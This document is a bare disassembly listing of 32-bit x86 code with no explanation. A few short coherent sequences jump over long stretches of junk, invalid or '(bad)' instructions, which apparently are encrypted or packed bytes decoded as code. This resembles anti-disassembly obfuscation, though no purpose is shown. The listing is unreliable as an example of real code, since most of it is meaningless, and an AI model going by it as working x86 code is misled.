  405119:	mov    ecx,DWORD PTR [ebp+0x10]
  40511c:	add    eax,esi
  40511e:	mov    DWORD PTR [ecx],eax
  405120:	jmp    0x405480
  405125:	xchg   edi,eax
  405126:	rol    DWORD PTR ds:0xb5744198,1
  40512c:	icebp  
  40512d:	lods   al,BYTE PTR ds:[esi]
  40512e:	add    al,0x98
  405130:	shr    eax,0x26
  405133:	mov    eax,ds:0x702b5361
  405138:	jo     0x405177
  40513a:	jge    0x4051ac
  40513c:	jo     0x4050ca
  40513e:	iret   
  40513f:	and    eax,0x5f1aaa6c
  405144:	fld    TBYTE PTR [eax+ebp*1-0x6c395ec0]
  40514b:	adc    al,0x89
  40514d:	arpl   dx,ax
  40514f:	retf   
  405150:	xchg   BYTE PTR [ecx-0x16e38e7e],cl
  405156:	mov    ebx,0x8d90ffac
  40515b:	adc    esp,DWORD PTR [ecx]
  40515d:	in     al,0x68
  40515f:	sub    DWORD PTR [edi],0x4
  405162:	rcl    DWORD PTR [eax-0x21a58a55],1
  405168:	pop    ebp
  405169:	xor    eax,0xc6a944b8
  40516e:	fcmovnu st,st(4)
  405170:	cmp    DWORD PTR [edi-0x69],ebp
  405173:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405174:	test   BYTE PTR [ebx+ebp*2],0x68
  405178:	fistp  QWORD PTR [ebx]
  40517a:	stc    
  40517b:	shr    BYTE PTR ss:[ecx-0x63a6476a],1
  405182:	xchg   esi,eax
  405183:	add    DWORD PTR [esi+edi*2-0x4529e7e0],0x2ad23a35
  40518e:	ds popa 
  405190:	sbb    al,0x46
  405192:	cmp    ebp,DWORD PTR [edx]
  405194:	mov    esp,0x5362238c
  405199:	pop    ss
  40519a:	adc    BYTE PTR [ebp+0x214219c],bl
  4051a0:	mov    dl,0x7a
  4051a2:	cmp    DWORD PTR [ecx-0xe],esi
  4051a5:	shr    cl,0xfa
  4051a8:	cld    
  4051a9:	aam    0xe4
  4051ab:	xor    al,0xab
  4051ad:	pop    ecx
  4051ae:	and    DWORD PTR [esi+edx*4+0x1c],ebp
  4051b2:	xlat   BYTE PTR ds:[ebx]
  4051b3:	nop
  4051b4:	lahf   
  4051b5:	push   ebx
  4051b6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4051b7:	or     DWORD PTR [ebx+0xd75e3a4],edx
  4051bd:	mov    ds:0xc220b40e,al
  4051c2:	dec    esi
  4051c3:	jno    0x405243
  4051c5:	dec    esi
  4051c6:	in     eax,0x8c
  4051c8:	cwde   
  4051c9:	dec    ebp
  4051ca:	jg     0x405193
  4051cc:	pop    ebp
  4051cd:	int3   
  4051ce:	jecxz  0x4051d5
  4051d0:	enter  0xf363,0x23
  4051d4:	pop    ss
  4051d5:	inc    edi
  4051d6:	js     0x405161
  4051d8:	gs push ebx
  4051da:	ds jb  0x405220
  4051dd:	mov    BYTE PTR [ebx-0x44],0xf2
  4051e1:	xor    BYTE PTR [ebx],dl
  4051e3:	cld    
  4051e4:	adc    ah,dl
  4051e6:	lods   al,BYTE PTR ds:[esi]
  4051e7:	test   DWORD PTR [ebx],ebx
  4051e9:	test   BYTE PTR [esi+0x59],0x5e
  4051ed:	jecxz  0x40521e
  4051ef:	and    dh,dl
  4051f1:	mov    al,ds:0xf10e3b07
  4051f6:	mov    ah,0xdb
  4051f8:	mov    ebp,0x2e9ba41c
  4051fd:	sbb    eax,DWORD PTR [eax-0x46]
  405200:	iret   
  405201:	(bad)  
  405202:	sub    eax,0x7b8281f9
  405207:	fwait
  405208:	pop    esi
  405209:	cmc    
  40520a:	and    ebp,DWORD PTR [ebx]
  40520c:	ret    
  40520d:	mov    ah,0x67
  40520f:	push   edi
  405210:	push   ss
  405211:	cmp    edx,DWORD PTR [eax-0x54]
  405214:	lds    ebx,FWORD PTR [esi+eiz*8]
  405217:	cld    
  405218:	lahf   
  405219:	leave  
  40521a:	imul   edi,DWORD PTR cs:[esi],0xe
  40521e:	lods   al,BYTE PTR ds:[esi]
  40521f:	or     eax,0x9f1c653c
  405224:	pop    ds
  405225:	psubsw mm4,QWORD PTR [esi-0x23a3803e]
  40522c:	retf   
  40522d:	data16 fadd st(0),st
  405230:	jne    0x40528e
  405232:	inc    edx
  405233:	dec    ebx
  405234:	xor    al,0x68
  405236:	xlat   BYTE PTR ds:[ebx]
  405237:	or     eax,esi
  405239:	push   ecx
  40523a:	mov    eax,0x82d60ee0
  40523f:	out    0x34,al
  405241:	int3   
  405242:	add    eax,0x84005a68
  405247:	xchg   edx,eax
  405248:	dec    esp
  405249:	jge    0x4051ff
  40524b:	cmp    al,0x53
  40524d:	jo     0x4051d3
  40524f:	loop   0x405268
  405251:	mov    dl,0x9b
  405253:	(bad)  
  405254:	push   eax
  405255:	mov    dl,0xa5
  405257:	addr16 retf 
  405259:	and    DWORD PTR [ecx],0xfffffff9
  40525c:	std    
  40525d:	js     0x4052c1
  40525f:	inc    ebp
  405260:	(bad)  
  405261:	jmp    0x405284
  405263:	sub    DWORD PTR [ebp+0x48a3a6f5],edx
  405269:	xchg   ecx,eax
  40526a:	and    BYTE PTR [edi+eax*4],dl
  40526d:	push   eax
  40526e:	add    DWORD PTR [edi+0x559747ce],ebx
  405274:	xchg   ebp,eax
  405275:	jle    0x405238
  405277:	mov    edi,0x8eb32cfa
  40527c:	jbe    0x4052fd
  40527e:	sahf   
  40527f:	daa    
  405280:	arpl   sp,ax
  405282:	mov    ecx,0xca3a6b79
  405287:	in     eax,0x6a
  405289:	scas   eax,DWORD PTR es:[edi]
  40528a:	inc    edi
  40528b:	pop    ds
  40528c:	adc    BYTE PTR [ecx],dh
  40528e:	popf   
  40528f:	clc    
  405290:	pop    ss
  405291:	mov    WORD PTR [edx+esi*2],?
  405294:	mov    ebx,0x1a09c03f
  405299:	das    
  40529a:	sbb    DWORD PTR [ebx],eax
  40529c:	pop    esp
  40529d:	pop    ecx
  40529e:	jge    0x4052a6
  4052a0:	lds    ecx,FWORD PTR [ebp+0x7763ac08]
  4052a6:	ins    BYTE PTR es:[edi],dx
  4052a7:	mov    ecx,0x4a6fd4a2
  4052ac:	arpl   WORD PTR [esi+0x57ce2743],di
  4052b2:	cmc    
  4052b3:	iret   
  4052b4:	jo     0x4052ca
  4052b6:	ins    DWORD PTR es:[edi],dx
  4052b7:	jg     0x405306
  4052b9:	loope  0x4052ea
  4052bb:	xor    eax,0xebc30b00
  4052c0:	test   BYTE PTR [edi],cl
  4052c2:	cmp    al,0x62
  4052c4:	nop
  4052c5:	repnz or DWORD PTR [ebp-0x3f3fda7],0xffffffd1
  4052cd:	lock lock mov dl,0xfd
  4052d1:	xor    ch,BYTE PTR [ebx+0x3c480b85]
  4052d7:	xor    ecx,DWORD PTR [edi-0x6bca1e1]
  4052dd:	bound  eax,QWORD PTR [edx]
  4052df:	add    al,0x80
  4052e1:	lds    eax,FWORD PTR [eax+0x16c41bed]
  4052e7:	pop    ecx
  4052e8:	xchg   esi,eax
  4052e9:	gs cmp al,0x6d
  4052ec:	out    dx,al
  4052ed:	or     al,0x71
  4052ef:	adc    DWORD PTR [edi-0x4c],esp
  4052f2:	pop    ecx
  4052f3:	ficomp WORD PTR [ebp+0x2929e054]
  4052f9:	xor    BYTE PTR [eax],0x50
  4052fc:	xlat   BYTE PTR ds:[ebx]
  4052fd:	(bad)  
  4052fe:	int    0xa2
  405300:	and    bh,BYTE PTR [ecx-0x1f]
  405303:	test   DWORD PTR [ebx+0x28],edi
  405306:	and    al,0x92
  405308:	xor    BYTE PTR [esi+0x31f01576],ah
  40530e:	lods   eax,DWORD PTR ds:[esi]
  40530f:	xchg   ebp,eax
  405310:	stos   BYTE PTR es:[edi],al
  405311:	sar    BYTE PTR [edx+edx*1],0x9d
  405315:	and    edi,esi
  405317:	test   al,0x52
  405319:	xchg   esp,eax
  40531a:	imul   ebp,edx,0xd38a95cb
  405320:	jecxz  0x4052f5
  405322:	ja     0x405366
  405324:	push   cs
  405325:	dec    edi
  405326:	mov    esp,DWORD PTR [eax]
  405328:	jmp    0xe7c82277
  40532d:	xchg   ebx,eax
  40532e:	iret   
  40532f:	cld    
  405330:	imul   esp,DWORD PTR ds:0x9037088b,0x9764e8d0
  40533a:	push   0x3bff223
  40533f:	iret   
  405340:	jle    0x405396
  405342:	push   0x22
  405344:	(bad)  [esi+ecx*1]
  405347:	pop    ecx
  405348:	lahf   
  405349:	jge    0x405367
  40534b:	sub    eax,0x34e3c5a6
  405350:	push   eax
  405351:	cwde   
  405352:	ja     0x405312
  405354:	dec    esp
  405355:	jge    0x4053c9
  405357:	fild   DWORD PTR [ecx]
  405359:	xor    al,0x6b
  40535b:	jg     0x40533d
  40535d:	dec    ebp
  40535e:	outs   dx,DWORD PTR ds:[esi]
  40535f:	pushf  
  405360:	inc    ecx
  405361:	and    DWORD PTR [ebp-0x2],edx
  405364:	out    0xe5,al
  405366:	xor    DWORD PTR [esi+0x2a],ecx
  405369:	pop    eax
  40536a:	int    0xc
  40536c:	xchg   ecx,eax
  40536d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40536e:	ds call 0x1bd6:0xcc468417
  405376:	cli    
  405377:	pop    edi
  405378:	xor    ebp,esp
  40537a:	sbb    DWORD PTR [eax+edx*8],eax
  40537d:	fst    QWORD PTR [edi+0x33]
  405380:	out    dx,eax
  405381:	(bad)  
  405383:	adc    eax,0xb1e50920
  405388:	nop
  405389:	jbe    0x405365
  40538b:	arpl   sp,cx
  40538d:	add    al,0x79
  40538f:	sahf   
  405390:	retf   
  405391:	pop    eax
  405392:	jge    0x405387
  405394:	mov    bh,0x59
  405396:	cmp    dh,cl
  405398:	ret    0x87ba
  40539b:	daa    
  40539c:	fs sti 
  40539e:	add    eax,0xcbe90afb
  4053a3:	out    dx,al
  4053a4:	aas    
  4053a5:	int3   
  4053a6:	daa    
  4053a7:	xchg   esi,eax
  4053a8:	mov    dl,0xe6
  4053aa:	outs   dx,BYTE PTR ds:[esi]
  4053ab:	outs   dx,DWORD PTR ds:[esi]
  4053ac:	lock in al,dx
  4053ae:	imul   ebp,DWORD PTR [edi],0x6b6da1a2
  4053b4:	and    BYTE PTR fs:[ecx],bh
  4053b7:	or     eax,0x9e0c56c0
  4053bc:	mov    dl,0x9e
  4053be:	jge    0x40537f
  4053c0:	cwde   
  4053c1:	ret    
  4053c2:	retf   
  4053c3:	rcr    DWORD PTR [ebp-0x34d6efff],cl
  4053c9:	js     0x40538c
  4053cb:	cmp    eax,0x351fbb6b
  4053d0:	xor    esp,edi
  4053d2:	mov    edx,0x1e45c214
  4053d7:	jg     0x405441
  4053d9:	call   0x4d56:0x4131578e
  4053e0:	mov    esp,DWORD PTR [ecx+ebx*2+0x99d7195]
  4053e7:	xor    ecx,ebx
  4053e9:	fstp   QWORD PTR [esi+0x67]
  4053ec:	push   ebp
  4053ed:	dec    edi
  4053ee:	sub    eax,DWORD PTR [ebx]
  4053f0:	push   edi
  4053f1:	ret    
  4053f2:	popf   
  4053f3:	inc    edx
  4053f4:	mov    ds:0x2481fac4,eax
  4053f9:	or     DWORD PTR [ebx],0x67326283
  4053ff:	(bad)  
  405400:	push   eax
  405401:	and    DWORD PTR [edi-0x48956b39],esp
  405407:	inc    esp
  405408:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405409:	jmp    0x405436
  40540b:	jnp    0x40548b
  40540d:	adc    esi,esp
  40540f:	or     BYTE PTR [ecx-0x39dcff0b],ah
  405415:	cmp    DWORD PTR [edx],ebp
  405417:	cld    
  405418:	push   edi
  405419:	inc    ecx
  40541a:	cmp    bh,BYTE PTR [si-0x55]
  40541e:	jbe    0x405403
  405420:	push   0x6e7b73fe
  405425:	push   0x0
  405427:	hlt    
  405428:	loope  0x405413
  40542a:	(bad)  
  40542b:	lods   eax,DWORD PTR ds:[esi]
  40542c:	push   eax
  40542d:	cmp    al,ch
  40542f:	sbb    BYTE PTR [eax],bh
  405431:	inc    eax
  405432:	ret    0xfe5
  405435:	push   ebp
  405436:	xor    dh,ch
  405438:	sub    al,BYTE PTR [esp+eax*8+0x7a66f47b]
  40543f:	ins    BYTE PTR es:[edi],dx
  405440:	adc    edi,esp
  405442:	or     BYTE PTR [ebx],bl
  405444:	lods   eax,DWORD PTR ds:[esi]
  405445:	mov    eax,ds:0xd9a58161
  40544a:	mov    ecx,0xa225e90c
  40544f:	mov    edi,0x1684beab
  405454:	push   cs
  405455:	pop    esi
  405456:	les    esi,FWORD PTR [edx]
  405458:	les    esi,FWORD PTR [eax]
  40545a:	pop    ecx
  40545b:	mov    edx,0xc83a2f78
  405460:	sub    ch,BYTE PTR [eax+0xc]
  405463:	(bad)  
  405464:	cld    
  405465:	aas    
  405466:	jmp    0x2ab6:0x58766523
  40546d:	mov    ds:0xbee0f20,al
  405472:	(bad)  
  405473:	adc    eax,DWORD PTR [eax]
  405475:	ret    0x50a5
  405478:	xchg   ecx,eax
  405479:	mov    edx,0xd88dc1cc
  40547e:	sub    DWORD PTR [esi+0x5e],edi
  405481:	leave  
  405482:	ret    0xc
  405485:	push   ebp
  405486:	mov    ebp,esp
  405488:	push   ecx
  405489:	mov    edx,DWORD PTR ds:0x42e784
  40548f:	mov    edx,DWORD PTR [edx]
  405491:	sbb    DWORD PTR ds:0x42e6eb,edx
  405497:	jmp    0x40576a
  40549c:	pop    ecx
  40549d:	scas   al,BYTE PTR es:[edi]
  40549e:	sbb    BYTE PTR [ebx-0xd],al
  4054a1:	push   ecx
  4054a2:	pop    ecx
  4054a3:	mov    dh,0xd4
  4054a5:	(bad)
  4054a8:	pop    ss
  4054a9:	mov    edi,0x37105123
  4054ae:	jo     0x405520
  4054b0:	stos   BYTE PTR es:[edi],al
  4054b1:	jle    0x405523
  4054b3:	jo     0x405485
  4054b5:	adc    bh,ch
  4054b7:	pushf  
  4054b8:	ds (bad) 
  4054ba:	pop    edx
  4054bb:	outs   dx,BYTE PTR ds:[esi]
  4054bc:	std    
  4054bd:	std    
  4054be:	jp     0x405487
  4054c0:	xor    al,0x20
  4054c2:	dec    eax
  4054c3:	xor    ecx,DWORD PTR [ecx-0x35]
  4054c6:	scas   al,BYTE PTR es:[edi]
  4054c7:	cli    
  4054c8:	gs jo  0x4054a2
  4054cb:	call   0x251d246b
  4054d0:	pop    edi
  4054d1:	fdiv   QWORD PTR ds:0x6a68bfe0
  4054d7:	mov    ch,0x21
  4054d9:	sub    eax,0xec2e0b86
  4054de:	inc    eax
  4054df:	mov    ch,0xa1
  4054e1:	pusha  
  4054e2:	iret   
  4054e3:	mov    dh,0xe6
  4054e5:	push   eax
  4054e6:	fist   WORD PTR [edi-0x5]
  4054e9:	push   esi
  4054ea:	mov    gs,WORD PTR [esi-0x39]
  4054ed:	mov    edx,0x8670670b
  4054f2:	mov    ds:0xf2eb03a7,al
  4054f7:	xchg   esi,eax
  4054f8:	mov    DWORD PTR [edx],edx
  4054fa:	mov    al,0x82
  4054fc:	imul   bh
  4054fe:	mov    bl,0x59
  405500:	pop    edi
  405501:	loope  0x40550b
  405503:	adc    al,0x48
  405505:	pop    es
  405506:	stc    
  405507:	push   es
  405508:	add    bl,ah
  40550a:	nop
  40550b:	add    eax,0xbb8e531d
  405510:	pop    ss
  405511:	mov    ds:0xaf8ad971,eax
  405516:	int    0xb4
  405518:	jae    0x4054d4
  40551a:	call   0xb8c31b9e
  40551f:	pop    es
  405520:	retf   0x2c2f
  405523:	push   ebp
  405524:	outs   dx,BYTE PTR ds:[esi]
  405525:	ret    
  405526:	push   ebx
  405527:	sub    BYTE PTR [ecx],0xa2
  40552a:	jmp    0x4054b7
  40552c:	mov    cl,0xab
  40552e:	lods   eax,DWORD PTR ds:[esi]
  40552f:	xchg   ebp,eax
  405530:	imul   eax,DWORD PTR [ebp+0x4c2cad56],0xffffff82
  405537:	lahf   
  405538:	data16 loope 0x4055b4
  40553b:	mov    esp,0x455a7081
  405540:	push   es
  405541:	repnz loop 0x405597
  405544:	adc    DWORD PTR ds:0x170512a1,esp
  40554a:	inc    eax
  40554b:	nop
  40554c:	loope  0x4054f9
  40554e:	jge    0x40553d
  405550:	push   cs
  405551:	ss mov bh,0xff
  405554:	je     0x405533
  405556:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405557:	mov    edi,0x68118ca6
  40555c:	pop    es
  40555d:	mov    edx,0xfb20a8a2
  405562:	jae    0x4055e1
  405564:	es add dl,bh
  405567:	push   eax
  405568:	mov    ebp,0xb364197b
  40556d:	push   esi
  40556e:	sti    
  40556f:	mov    ss,WORD PTR [ecx+ebp*8+0x25]
  405573:	push   ebx
  405574:	xchg   esi,eax
  405575:	xchg   DWORD PTR ds:0x2618aa6e,edx
  40557b:	icebp  
  40557c:	jo     0x4055af
  40557e:	adc    al,0x66
  405580:	dec    edx
  405581:	fcomp  QWORD PTR [edi]
  405583:	and    eax,0x43251138
  405588:	xor    DWORD PTR [ecx],0xa99d0bb1
  40558e:	dec    ebx
  40558f:	dec    edx
  405590:	pop    edi
  405591:	mov    ch,0x57
  405593:	arpl   WORD PTR [ebx+0x1f],si
  405596:	outs   dx,DWORD PTR ds:[esi]
  405597:	xchg   ecx,eax
  405598:	sar    BYTE PTR [edx],cl
  40559a:	mov    bh,0xd6
  40559c:	aas    
  40559d:	sahf   
  40559e:	xor    al,0x47
  4055a0:	hlt    
  4055a1:	jg     0x405576
  4055a3:	in     al,dx
  4055a4:	pop    es
  4055a5:	jnp    0x4055ce
  4055a7:	mov    ah,0xb3
  4055a9:	or     DWORD PTR [ecx+0x66],0x20162ec2
  4055b0:	xor    bl,BYTE PTR [eax]
  4055b2:	jno    0x405620
  4055b4:	cs mov dl,0x8f
  4055b7:	inc    edx
  4055b8:	dec    edi
  4055b9:	test   DWORD PTR [edi+0x1b],edx
  4055bc:	adc    edx,DWORD PTR [ebp+0x681d145d]
  4055c2:	xchg   edi,eax
  4055c3:	pop    ecx
  4055c4:	jns    0x405548
  4055c6:	xor    BYTE PTR [esi-0x41],bl
  4055c9:	pushf  
  4055ca:	pusha  
  4055cb:	(bad)  
  4055cc:	out    dx,eax
  4055cd:	push   ss
  4055ce:	call   0x94249f43
  4055d3:	mov    cl,0xb0
  4055d5:	xor    DWORD PTR [edx],eax
  4055d7:	jl     0x4055a1
  4055d9:	nop
  4055da:	imul   ecx
  4055dc:	out    dx,eax
  4055dd:	std    
  4055de:	push   cs
  4055df:	shr    dh,cl
  4055e1:	popa   
  4055e2:	add    DWORD PTR [ebx+esi*1+0xd],esp
  4055e6:	loopne 0x405590
  4055e8:	dec    esi
  4055e9:	aas    
  4055ea:	xor    DWORD PTR [ebp-0x6e919987],0x6
  4055f1:	mov    WORD PTR [esi],?
  4055f3:	mov    al,0x53
  4055f5:	lods   al,BYTE PTR ds:[esi]
  4055f6:	aam    0xf3
  4055f8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4055f9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4055fa:	daa    
  4055fb:	retf   
  4055fc:	jge    0x405641
  4055fe:	test   BYTE PTR [edi-0x72],bh
  405601:	fist   DWORD PTR [edx]
  405603:	dec    edx
  405604:	xor    BYTE PTR [eax],ah
  405606:	inc    edx
  405607:	sbb    eax,0x1c4dc72c
  40560c:	jbe    0x40562f
  40560e:	sub    BYTE PTR [ebx+0x73ed46e5],0x10
  405615:	(bad)  
  405616:	mov    ecx,0x4e7a4941
  40561b:	inc    ebx
  40561c:	or     eax,0x3b7ab2af
  405621:	jo     0x4055ad
  405623:	push   cs
  405624:	loop   0x40566e
  405626:	pop    ss
  405627:	pop    edx
  405628:	or     BYTE PTR [edi],bh
  40562a:	xchg   ebp,eax
  40562b:	push   edx
  40562c:	push   cs
  40562d:	mov    ds,WORD PTR [ebx]
  40562f:	jne    0x405637
  405631:	sar    esp,cl
  405633:	popf   
  405634:	(bad)  
  405635:	adc    al,cl
  405637:	div    DWORD PTR [edx-0x23]
  40563a:	fdivp  st(5),st
  40563c:	out    dx,al
  40563d:	push   0x93b9fa90
  405642:	(bad)  
  405643:	mov    ebp,0xb70afec0
  405648:	(bad)  
  405649:	clc    
  40564a:	sbb    eax,0xcada7f9d
  40564f:	rcl    esi,1
  405651:	int    0xa9
  405653:	in     eax,dx
  405654:	lock push 0x42
  405657:	jle    0x4056ce
  405659:	push   ebx
  40565a:	or     esp,DWORD PTR [edi+edi*4-0xde10b9]
  405661:	jns    0x405683
  405663:	pusha  
  405664:	mov    ds:0xf1faa3ae,eax
  405669:	(bad)  
  40566c:	imul   BYTE PTR [ebx]
  40566e:	inc    edi
  40566f:	stos   BYTE PTR es:[edi],al
  405670:	and    eax,0xde817170
  405675:	jnp    0x40568a
  405677:	fcomp  st(4)
  405679:	mov    BYTE PTR [edi-0x7b3d5d4f],dl
  40567f:	(bad)  
  405680:	sub    cl,BYTE PTR [esi]
  405682:	cli    
  405683:	jg     0x405668
  405685:	(bad)  [ebp+0x2b7ac2a8]
  40568b:	push   es
  40568c:	dec    edi
  40568d:	sub    cl,bl
  40568f:	jne    0x405624
  405691:	mov    dl,0x70
  405693:	mov    ebx,0x5398853
  405698:	and    BYTE PTR [esi],bl
  40569a:	sbb    dl,bh
  40569c:	repnz mov al,ds:0x95e48554
  4056a2:	jmp    0xdc7823bd
  4056a7:	mov    ecx,0xeb3c6dcd
  4056ac:	inc    ebp
  4056ad:	adc    eax,0xf8848026
  4056b2:	mov    ah,0x82
  4056b4:	fild   QWORD PTR [edx-0x44b1f39]
  4056ba:	into   
  4056bb:	in     eax,0x74
  4056bd:	in     al,dx
  4056be:	add    edi,DWORD PTR [ebx+0x48]
  4056c1:	xor    eax,0xd032220b
  4056c6:	lods   eax,DWORD PTR ds:[esi]
  4056c7:	rol    BYTE PTR [ebx+edi*4],0x62
  4056cb:	retf   0x9aad
  4056ce:	repnz mov ds:0xf642806b,eax
  4056d4:	dec    ecx
  4056d5:	fistp  WORD PTR [edx-0x6c]
  4056d8:	dec    edi
  4056d9:	dec    edx
  4056da:	outs   dx,DWORD PTR ds:[esi]
  4056db:	mov    WORD PTR [ebp-0x3f88fdcb],es
  4056e1:	or     eax,0x9bcc2cee
  4056e6:	sbb    BYTE PTR [edx+0x10e66c29],0xb1
  4056ed:	dec    edx
  4056ee:	mov    ah,0xe6
  4056f0:	or     ch,BYTE PTR ds:0xce876d0e
  4056f6:	add    DWORD PTR [ecx-0x5ec5c0f7],0x2f
  4056fd:	pop    ebp
  4056fe:	mov    al,ds:0x4d0d1aa1
  405703:	fstp   QWORD PTR [edx]
  405705:	jne    0x405726
  405707:	jg     0x4056b2
  405709:	inc    esp
  40570a:	enter  0x2b4c,0x6c
  40570e:	push   ebx
  40570f:	mov    edx,ecx
  405711:	test   BYTE PTR [ebx+0x5ac2973b],bl
  405717:	pop    ebx
  405718:	pop    ds
  405719:	in     al,0x4a
  40571b:	mov    eax,0x2f55646b
  405720:	loope  0x405729
  405722:	dec    eax
  405723:	fwait
  405724:	out    0x1f,eax
  405726:	add    al,0x43
  405728:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405729:	push   esp
  40572a:	dec    edi
  40572b:	or     BYTE PTR [eax-0x52],0xd2
  40572f:	inc    ecx
  405730:	jno    0x4056b8
  405732:	dec    edx
  405733:	pusha  
  405734:	sub    BYTE PTR [ebx-0x785265a0],bh
  40573a:	sub    bh,BYTE PTR [eax]
  40573c:	lds    esp,FWORD PTR [edx-0x73059398]
  405742:	jb     0x40574e
  405744:	jecxz  0x4057b6
  405746:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405747:	inc    edx
  405748:	popa   
  405749:	sbb    DWORD PTR [esp+0x73],eax
  40574d:	ja     0x4056db
  40574f:	lahf   
  405750:	ins    BYTE PTR es:[edi],dx
  405751:	pusha  
  405752:	loop   0x405755
  405754:	sub    BYTE PTR [edx],bl
  405756:	stos   BYTE PTR es:[edi],al
  405757:	cmp    DWORD PTR [edx],0x9615b2d0
  40575d:	mov    al,ds:0x819ecdea
  405762:	les    eax,FWORD PTR [eax]
  405764:	or     ch,BYTE PTR [esi-0xb5c66]
  40576a:	push   ecx
  40576b:	movzx  eax,WORD PTR ds:0x42fd86
  405772:	and    eax,DWORD PTR ds:0x42fd7a
  405778:	mov    ds:0x42fd86,eax
  40577d:	jmp    0x405a50
  405782:	ja     0x4057cf
  405784:	and    eax,0x717221b4
  405789:	dec    ebx
  40578a:	xchg   DWORD PTR [edx-0x51966e42],eax
  405790:	xor    eax,0x7070354a
  405796:	stos   BYTE PTR es:[edi],al
  405797:	jle    0x405809
  405799:	jo     0x4057f7
  40579b:	sbb    BYTE PTR [esi],ah
  40579d:	pop    ss
  40579e:	jno    0x4057ea
  4057a0:	dec    edi
  4057a1:	jecxz  0x40581f
  4057a3:	mov    dl,0x19
  4057a5:	xchg   ebx,eax
  4057a6:	imul   eax,DWORD PTR [edx-0x5a],0x6f
  4057aa:	popf   
  4057ab:	inc    esp
  4057ac:	pop    ds
  4057ad:	pop    esi
  4057ae:	(bad)  
  4057af:	data16 cmp al,0x6
  4057b2:	mov    ebp,0xbe9ffe9e
  4057b7:	mov    edx,DWORD PTR [edi+0x1c]
  4057ba:	xchg   esi,eax
  4057bb:	test   esp,ebp
  4057bd:	mov    edx,0xee9d8521
  4057c2:	fldln2 
  4057c4:	int    0xb0
  4057c6:	std    
  4057c7:	fstp   QWORD PTR gs:[esi+esi*4]
  4057cb:	outs   dx,DWORD PTR ds:[esi]
  4057cc:	jae    0x405835
  4057ce:	gs pop eax
  4057d0:	mov    edi,gs
  4057d2:	jne    0x405838
  4057d4:	in     al,dx
  4057d5:	mov    edi,0xacafac6a
  4057da:	mov    al,ds:0x23adf9e8
  4057df:	jns    0x40580a
  4057e1:	dec    ebx
  4057e2:	xor    DWORD PTR [ebx+esi*8-0x40349b37],esp
  4057e9:	mov    al,ds:0x8df170d5
  4057ee:	or     ebp,ebp
  4057f0:	add    al,0x9e
  4057f2:	lods   eax,DWORD PTR ds:[esi]
  4057f3:	add    esi,DWORD PTR [eax-0x594312ac]
  4057f9:	mov    DWORD PTR [ecx+0x1ed2b9ff],ebx
  4057ff:	cmp    al,0x7d
  405801:	xchg   DWORD PTR [edx],ecx
  405803:	xor    ebp,esi
  405805:	push   ds
  405806:	jb     0x405876
  405808:	retf   0xb014
  40580b:	icebp  
  40580c:	dec    ebp
  40580d:	pop    es
  40580e:	sbb    bl,BYTE PTR [edi-0x41640aa1]
  405814:	mov    DWORD PTR [edi+0xdd11f42],edi
  40581a:	sub    BYTE PTR [edi+0x33],bl
  40581d:	adc    ebp,DWORD PTR [esi-0x80]
  405820:	inc    ebp
  405821:	repnz adc ebp,edx
  405824:	lea    eax,[edi-0x1d]
  405827:	outs   dx,DWORD PTR ds:[esi]
  405828:	and    BYTE PTR [ebp+eiz*4+0x58],al
  40582c:	call   0x3b8e:0xe690f6f4
  405833:	pop    ds
  405834:	xchg   ebp,eax
  405835:	or     al,0x98
  405837:	push   es
  405838:	popf   
  405839:	leave  
  40583a:	ror    BYTE PTR ds:0x9bbf9489,cl
  405840:	cmc    
  405841:	or     eax,0xc7658cb1
  405846:	fwait
  405847:	imul   BYTE PTR [eax+0x58]
  40584a:	jmp    0x4058a3
  40584c:	jle    0x405849
  40584e:	js     0x4057da
  405850:	mov    ch,0x75
  405852:	sbb    dh,dl
  405854:	cmp    eax,0xe04de1a2
  405859:	call   0x1df9d44d
  40585e:	addr16 loopne 0x4057ec
  405861:	sahf   
  405862:	dec    eax
  405863:	adc    al,0x9c
  405865:	xor    ebx,DWORD PTR [di+0x2a17]
  40586a:	sub    eax,0xe3893937
  40586f:	retf   0xb478
  405872:	stos   BYTE PTR es:[edi],al
  405873:	lock lods al,BYTE PTR ds:[esi]
  405875:	adc    dl,BYTE PTR [edx-0x611234c0]
  40587b:	dec    edi
  40587c:	ror    DWORD PTR ds:0x9efa4dc9,0xc4
  405883:	aas    
  405884:	(bad)  
  405885:	out    dx,al
  405886:	xor    al,0xc8
  405888:	out    0x6b,eax
  40588a:	mov    al,ds:0x5448c769
  40588f:	push   ds
  405890:	xlat   BYTE PTR ds:[ebx]
  405891:	int    0x98
  405893:	sub    bh,ch
  405895:	mov    al,0xb7
  405897:	ret    
  405898:	and    BYTE PTR [ebp+0x63],dl
  40589b:	js     0x40581f
  40589d:	dec    ecx
  40589e:	and    eax,0xf1973997
  4058a3:	dec    ecx
  4058a4:	out    dx,al
  4058a5:	out    dx,eax
  4058a6:	and    al,0x42
  4058a8:	dec    edi
  4058a9:	add    DWORD PTR [ecx-0x70],0x27cc429b
  4058b0:	xchg   ebx,eax
  4058b1:	stc    
  4058b2:	(bad)  
  4058b3:	int3   
  4058b4:	dec    ebp
  4058b5:	idiv   DWORD PTR [edi+eax*1]
  4058b8:	xchg   DWORD PTR [esi],esp
  4058ba:	scas   al,BYTE PTR es:[edi]
  4058bb:	push   es
  4058bc:	pusha  
  4058bd:	dec    edi
  4058be:	(bad)  
  4058bf:	fbld   TBYTE PTR [eax]
  4058c1:	xor    eax,0xdaf01cba
  4058c6:	shl    BYTE PTR [edx+0xc99f6a4],0xcf
  4058cd:	mov    ch,0x23
  4058cf:	adc    BYTE PTR [ecx-0x14],dl
  4058d2:	aam    0x33
  4058d4:	cwde   
  4058d5:	or     al,0x6
  4058d7:	sbb    al,0x87
  4058d9:	inc    esp
  4058da:	cmp    ebp,DWORD PTR [ebp-0xf60cbde]
  4058e0:	mov    eax,0xcec920e0
  4058e5:	sbb    DWORD PTR [eax-0x3ba0d2cf],esp
  4058eb:	jle    0x405962
  4058ed:	jmp    0x6a06537c
  4058f2:	jbe    0x40588d
  4058f4:	(bad)  
  4058f5:	out    0xd2,al
  4058f7:	repz int3 
